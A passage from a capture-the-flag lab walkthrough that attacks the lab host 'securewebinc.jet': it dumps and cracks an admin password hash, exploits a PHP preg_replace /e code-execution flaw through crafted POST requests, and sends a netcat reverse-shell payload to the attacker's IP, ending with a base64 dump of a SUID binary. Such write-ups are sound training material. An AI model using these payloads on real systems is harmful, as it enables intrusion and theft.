\[09:40:04] \[INFO] recognized possible password hashes in column 'password'

do you want to store hashes to a temporary file for eventual further processing with other tools \[y/N] N

do you want to crack them via a dictionary-based attack? \[Y/n/q] Y

\[09:40:04] \[INFO] using hash method 'sha256\_generic\_passwd'

what dictionary do you want to use?

\[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx\_' (press Enter)

\[2] custom dictionary file

\[3] file with list of dictionary files

> 1

\[09:40:04] \[INFO] using default dictionary

do you want to use common password suffixes? (slow!) \[y/N] N

\[09:40:04] \[INFO] starting dictionary-based cracking (sha256\_generic\_passwd)

\[09:40:04] \[INFO] starting 4 processes 

\[09:40:13] \[WARNING] no clear password(s) found                                                                                                            

Database: jetadmin

Table: users

\[1 entry]

+----+------------------------------------------------------------------+----------+

| id | password                                                         | username |

+----+------------------------------------------------------------------+----------+

| 1  | 97114847aa12500d.....4ab9b0445b235d5084 | admin    |

+----+------------------------------------------------------------------+----------+



\[09:40:13] \[INFO] table 'jetadmin.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/www.securewebinc.jet/dump/jetadmin/users.csv'

\[09:40:13] \[INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/www.securewebinc.jet'



\[\*] ending @ 09:40:13 /2026-01-30/





We got the password hash for user admin.

Let's crack the hash using our favourite john the ripper.

First let's identify the hash type.



kali@kali:hash-identifier                                                                                                                                         

&nbsp;  #########################################################################

&nbsp;  #     \_\_  \_\_                     \_\_           \_\_\_\_\_\_    \_\_\_\_\_           #

&nbsp;  #    /\\ \\/\\ \\                   /\\ \\         /\\\_\_  \_\\  /\\  \_ `\\         #

&nbsp;  #    \\ \\ \\\_\\ \\     \_\_      \_\_\_\_ \\ \\ \\\_\_\_     \\/\_/\\ \\/  \\ \\ \\/\\ \\        #

&nbsp;  #     \\ \\  \_  \\  /'\_\_`\\   / ,\_\_\\ \\ \\  \_ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #

&nbsp;  #      \\ \\ \\ \\ \\/\\ \\\_\\ \\\_/\\\_\_, `\\ \\ \\ \\ \\ \\      \\\_\\ \\\_\_ \\ \\ \\\_\\ \\      #

&nbsp;  #       \\ \\\_\\ \\\_\\ \\\_\_\_ \\\_\\/\\\_\_\_\_/  \\ \\\_\\ \\\_\\     /\\\_\_\_\_\_\\ \\ \\\_\_\_\_/      #

&nbsp;  #        \\/\_/\\/\_/\\/\_\_/\\/\_/\\/\_\_\_/    \\/\_/\\/\_/     \\/\_\_\_\_\_/  \\/\_\_\_/  v1.2 #

&nbsp;  #                                                             By Zion3R #

&nbsp;  #                                                    www.Blackploit.com #

&nbsp;  #                                                   Root@Blackploit.com #

&nbsp;  #########################################################################

--------------------------------------------------

&nbsp;HASH: 97114847aa12500d....4ab9b0445b235d5084



Possible Hashs:

\[+] SHA-256

\[+] Haval-256





So, the hash is SHA-256, so we will use Raw-SA256 format for john.



kali@kali:john adminhash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256   

&nbsp;                                                                      

Using default input encoding: UTF-8

Loaded 1 password hash (Raw-SHA256 \[SHA256 128/128 SSE2 4x])

Warning: poor OpenMP scalability for this hash type, consider --fork=4

Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

Hack.....200 (?)     

1g 0:00:00:00 DONE (2026-01-30 09:46) 1.075g/s 11979Kp/s 11979Kc/s 11979KC/s Hannah.rules..Galgenwaard

Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably

Session completed.





So, let's login to the website with the creds we have:



Username: admin

Password: Hack.....200





After, logging in, we find another flag at the chats section of dashboard.



Flag4:JET{s.....n!}



Almost, all other features are not working, except the email function. The lab also hints us command, so most probably it is something related to command injection.

We intercept the email and find that the request has some verbal words. Sorry for that.



POST /dirb\_safe\_dir\_rf9EmcEIx/admin/email.php HTTP/1.1

Host: www.securewebinc.jet

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 303

Origin: http://www.securewebinc.jet

Connection: keep-alive

Referer: http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/dashboard.php

Cookie: PHPSESSID=p4k2q6mr1c6vpg0edun4ftnid7

Upgrade-Insecure-Requests: 1

Priority: u=0, i



swearwords%5B%2Ffuck%2Fi%5D=make+love\&swearwords%5B%2Fshit%2Fi%5D=poop\&swearwords%5B%2Fass%2Fi%5D=behind\&swearwords%5B%2Fdick%2Fi%5D=penis\&swearwords%5B%2Fwhore%2Fi%5D=escort\&swearwords%5B%2Fasshole%2Fi%5D=bad+person\&to=htb%40gmail.com\&subject=Nothing\&message=%3Cp%3ESurprise%3C%2Fp%3E\&\_wysihtml5\_mode=1







After some online research, I found out that this is most probably a preg\_replace() RCE vulnerability. Let's try it out.





After some trial and error, this finally worked.



POST /dirb\_safe\_dir\_rf9EmcEIx/admin/email.php HTTP/1.1

Host: www.securewebinc.jet

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 277

Origin: http://www.securewebinc.jet

Connection: keep-alive

Referer: http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/dashboard.php

Cookie: PHPSESSID=p4k2q6mr1c6vpg0edun4ftnid7

Upgrade-Insecure-Requests: 1

Priority: u=0, i



swearwords%5B%2Ffuck%2Fe%5D=system('ls')\&swearwords%5B%2Fshit%2Fi

%5D=poop\&swearwords%5B%2Fass%2Fi%5D=behind\&swearwords%5B%2Fdick%2Fi

%5D=penis\&swearwords%5B%2Fwhore%2Fi%5D=escort\&swearwords%5B%2Fasshole%2Fi

%5D=bad+person\&to=htb%40a.com\&subject=Hello\&message=you+are+a+fuck





HTTP/1.1 200 OK

Server: nginx/1.10.3 (Ubuntu)

Date: Fri, 30 Jan 2026 04:46:03 GMT

Content-Type: text/html; charset=UTF-8

Connection: keep-alive

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0

Pragma: no-cache

Content-Length: 3036



<!DOCTYPE html>

<html>

<head>

&nbsp;   <meta charset="utf-8">

&nbsp;   <meta http-equiv="X-UA-Compatible" content="IE=edge">

&nbsp;   <title>Secureweb Inc. | Email Sender</title>

&nbsp;   <!-- Tell the browser to be responsive to screen width -->

&nbsp;   <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">

&nbsp;   <!-- Bootstrap 3.3.7 -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/bootstrap/dist/css/bootstrap.min.css">

&nbsp;   <!-- Font Awesome -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/font-awesome/css/font-awesome.min.css">

&nbsp;   <!-- Ionicons -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/Ionicons/css/ionicons.min.css">

&nbsp;   <!-- Theme style -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/dist/css/AdminLTE.min.css">

&nbsp;   <!-- iCheck -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/plugins/iCheck/square/blue.css">



&nbsp;   <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->

&nbsp;   <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->

&nbsp;   <!--\[if lt IE 9]>

&nbsp;   <script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/js/html5shiv.min.js"></script>

&nbsp;   <script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/js/respond.min.js"></script>

&nbsp;   <!\[endif]-->



</head>

<body class="hold-transition login-page">

<div class="login-box" style="width: 800px;">

&nbsp;   <div class="login-logo">

&nbsp;       <b>Send Email</b>

&nbsp;   </div>

&nbsp;   <div class="login-box-body">

&nbsp;       <p class="login-box-msg">

&nbsp;           <i class="fa fa-warning text-warning"></i> <b>Warning:</b> Profanity filter is applied. Please check message before sending.

&nbsp;           <br>

&nbsp;       </p>



&nbsp;       <p><b>To: </b>htb@a.com</p>

&nbsp;       <p><b>Subject: </b>Hello</p>

&nbsp;       <p><b>Message</b></p>

&nbsp;       <hr>

&nbsp;       <p>

&nbsp;           a\_flag\_is\_here.txt

auth.php

badwords.txt

bower\_components

build

conf.php

dashboard.php

db.php

dist

dologin.php

email.php

index.php

js

login.php

logout.php

plugins

stats.php

uploads

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

&nbsp;       </p>

&nbsp;   </div>

&nbsp;   <a href="dashboard.php"> <button type="submit" class="btn btn-primary btn-block btn-flat">Send</button></a>



</div>



<!-- jQuery 3 -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/jquery/dist/jquery.min.js"></script>

<!-- Bootstrap 3.3.7 -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/bootstrap/dist/js/bootstrap.min.js"></script>

<!-- iCheck -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/plugins/iCheck/icheck.min.js"></script>

</body>

</html>



With this reuest we read another flag.



POST /dirb\_safe\_dir\_rf9EmcEIx/admin/email.php HTTP/1.1

Host: www.securewebinc.jet

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 297

Origin: http://www.securewebinc.jet

Connection: keep-alive

Referer: http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/dashboard.php

Cookie: PHPSESSID=p4k2q6mr1c6vpg0edun4ftnid7

Upgrade-Insecure-Requests: 1

Priority: u=0, i



swearwords%5B%2Ffuck%2Fe%5D=system('cat+a\_flag\_is\_here.txt')\&swearwords%5B%2Fshit%2Fi

%5D=poop\&swearwords%5B%2Fass%2Fi%5D=behind\&swearwords%5B%2Fdick%2Fi

%5D=penis\&swearwords%5B%2Fwhore%2Fi%5D=escort\&swearwords%5B%2Fasshole%2Fi

%5D=bad+person\&to=htb%40a.com\&subject=Hello\&message=you+are+a+fuck





HTTP/1.1 200 OK

Server: nginx/1.10.3 (Ubuntu)

Date: Fri, 30 Jan 2026 04:47:23 GMT

Content-Type: text/html; charset=UTF-8

Connection: keep-alive

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0

Pragma: no-cache

Content-Length: 2888



<!DOCTYPE html>

<html>

<head>

&nbsp;   <meta charset="utf-8">

&nbsp;   <meta http-equiv="X-UA-Compatible" content="IE=edge">

&nbsp;   <title>Secureweb Inc. | Email Sender</title>

&nbsp;   <!-- Tell the browser to be responsive to screen width -->

&nbsp;   <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">

&nbsp;   <!-- Bootstrap 3.3.7 -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/bootstrap/dist/css/bootstrap.min.css">

&nbsp;   <!-- Font Awesome -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/font-awesome/css/font-awesome.min.css">

&nbsp;   <!-- Ionicons -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/Ionicons/css/ionicons.min.css">

&nbsp;   <!-- Theme style -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/dist/css/AdminLTE.min.css">

&nbsp;   <!-- iCheck -->

&nbsp;   <link rel="stylesheet" href="/dirb\_safe\_dir\_rf9EmcEIx/admin/plugins/iCheck/square/blue.css">



&nbsp;   <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->

&nbsp;   <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->

&nbsp;   <!--\[if lt IE 9]>

&nbsp;   <script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/js/html5shiv.min.js"></script>

&nbsp;   <script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/js/respond.min.js"></script>

&nbsp;   <!\[endif]-->



</head>

<body class="hold-transition login-page">

<div class="login-box" style="width: 800px;">

&nbsp;   <div class="login-logo">

&nbsp;       <b>Send Email</b>

&nbsp;   </div>

&nbsp;   <div class="login-box-body">

&nbsp;       <p class="login-box-msg">

&nbsp;           <i class="fa fa-warning text-warning"></i> <b>Warning:</b> Profanity filter is applied. Please check message before sending.

&nbsp;           <br>

&nbsp;       </p>



&nbsp;       <p><b>To: </b>htb@a.com</p>

&nbsp;       <p><b>Subject: </b>Hello</p>

&nbsp;       <p><b>Message</b></p>

&nbsp;       <hr>

&nbsp;       <p>

&nbsp;           JET{p.....d}

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

<br />

<b>Warning</b>:  preg\_replace(): Unknown modifier '

' in <b>/var/www/html/dirb\_safe\_dir\_rf9EmcEIx/admin/email.php</b> on line <b>13</b><br />

&nbsp;       </p>

&nbsp;   </div>

&nbsp;   <a href="dashboard.php"> <button type="submit" class="btn btn-primary btn-block btn-flat">Send</button></a>



</div>



<!-- jQuery 3 -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/jquery/dist/jquery.min.js"></script>

<!-- Bootstrap 3.3.7 -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/bower\_components/bootstrap/dist/js/bootstrap.min.js"></script>

<!-- iCheck -->

<script src="/dirb\_safe\_dir\_rf9EmcEIx/admin/plugins/iCheck/icheck.min.js"></script>

</body>

</html>





Flag5:JET{p.....d}





Now, time to get a reverse shell. 



POST /dirb\_safe\_dir\_rf9EmcEIx/admin/email.php HTTP/1.1

Host: www.securewebinc.jet

User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:140.0) Gecko/20100101 Firefox/140.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 297

Origin: http://www.securewebinc.jet

Connection: keep-alive

Referer: http://www.securewebinc.jet/dirb\_safe\_dir\_rf9EmcEIx/admin/dashboard.php

Cookie: PHPSESSID=p4k2q6mr1c6vpg0edun4ftnid7

Upgrade-Insecure-Requests: 1

Priority: u=0, i



swearwords%5B%2Ffuck%2Fe%5D=system('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.65%201277%20%3E%2Ftmp%2Ff')\&swearwords%5B%2Fshit%2Fi

%5D=poop\&swearwords%5B%2Fass%2Fi%5D=behind\&swearwords%5B%2Fdick%2Fi

%5D=penis\&swearwords%5B%2Fwhore%2Fi%5D=escort\&swearwords%5B%2Fasshole%2Fi

%5D=bad+person\&to=htb%40a.com\&subject=Hello\&message=you+are+a+fuck





Don't forget to setup a listener at the specified port.



Boom, we get a shell. Let's stabilize our shell.



kali@kali:nc -nlvp 1277



listening on \[any] 1277 ...                                                                                                                                 

connect to \[10.10.16.65] from (UNKNOWN) \[10.13.37.10] 46436                                                                                                 

bash: cannot set terminal process group (991): Inappropriate ioctl for device                                                                               

bash: no job control in this shell                                                                                                                          

www-data@jet:~/html/dirb\_safe\_dir\_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'                                                         

<fe\_dir\_rf9EmcEIx/admin$ python3 -c 'import pty; pty.spawn ("/bin/bash")'                                                                                   

www-data@jet:~/html/dirb\_safe\_dir\_rf9EmcEIx/admin$  







Inside of home directory, we find a binary called leak, let's bring it to our attack machine and analyze.



www-data@jet:/home$ ls -la



total 44

drwxr-xr-x  8 root          root          4096 Apr  1  2018 .

drwxr-xr-x 23 root          root          4096 Apr  1  2018 ..

drwxrwx---  2 alex          alex          4096 Jan  3  2018 alex

drwxr-x---  7 ch4p          ch4p          4096 Apr  1  2018 ch4p

drwxr-x---  6 g0blin        g0blin        4096 Jul  3  2024 g0blin

-rwsr-xr-x  1 alex          alex          9112 Dec 12  2017 leak

drwxr-x---  2 membermanager membermanager 4096 Dec 28  2017 membermanager

drwxr-x---  2 memo          memo          4096 Dec 28  2017 memo

drwxr-xr-x  3 tony          tony          4096 Dec 28  2017 tony



It seems like we cannot use python server, let's use another method.



www-data@jet:/home$ cat leak | base64



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

UP7//wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAcAdAAAAAAABQB0AAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA

2AVAAAAAAAANAAAAAAAAAAQJQAAAAAAAGQAAAAAAAAAQDmAAAAAAABsAAAAAAAAACAAAAAAAAAAa

AAAAAAAAABgOYAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAJAAAAAAAAFAAAAAAAAAAAE

QAAAAAAABgAAAAAAAADIAkAAAAAAAAoAAAAAAAAAeAAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAA

AAAAAAAAAAAAAAAAAAMAAAAAAAAAABBgAAAAAAACAAAAAAAAAMAAAAAAAAAAFAAAAAAAAAAHAAAA

AAAAABcAAAAAAAAAGAVAAAAAAAAHAAAAAAAAALgEQAAAAAAACAAAAAAAAABgAAAAAAAAAAkAAAAA

AAAAGAAAAAAAAAD+//9vAAAAAJgEQAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAeARAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgOYAAAAAAA

AAAAAAAAAAAAAAAAAAAAABYGQAAAAAAAJgZAAAAAAAA2BkAAAAAAAEYGQAAAAAAAVgZAAAAAAABm

BkAAAAAAAHYGQAAAAAAAhgZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAR0NDOiAoVWJ1bnR1IDUuNC4w

LTZ1YnVudHUxfjE2LjA0LjUpIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAwABADgCQAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAA

AwADAHQCQAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFAMgCQAAA

AAAAAAAAAAAAAAAAAAAAAwAGAAAEQAAAAAAAAAAAAAAAAAAAAAAAAwAHAHgEQAAAAAAAAAAAAAAA

AAAAAAAAAwAIAJgEQAAAAAAAAAAAAAAAAAAAAAAAAwAJALgEQAAAAAAAAAAAAAAAAAAAAAAAAwAK

ABgFQAAAAAAAAAAAAAAAAAAAAAAAAwALANgFQAAAAAAAAAAAAAAAAAAAAAAAAwAMAAAGQAAAAAAA

